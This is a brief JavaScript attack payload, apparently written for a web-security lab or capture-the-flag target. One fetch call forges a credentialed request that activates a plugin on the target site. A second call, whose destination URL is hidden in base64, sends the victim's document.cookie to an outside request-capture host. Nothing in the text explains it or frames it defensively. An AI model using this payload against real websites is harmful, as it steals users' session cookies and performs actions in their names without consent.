fetch("http://website-l8lruj.inst.malicecyber.com/activate-plugin/1", {
    "credentials": "include",
    "referrer": "http://website-l8lruj.inst.malicecyber.com/show-plugins",
    "method": "GET"
});


fetch(atob('aHR0cHM6Ly9lb2pvY3d1a3hodWh6d3QubS5waXBlZHJlYW0ubmV0') + '/debug4', 
    {
        method: 'POST',
        body: btoa(document.cookie)
    }
)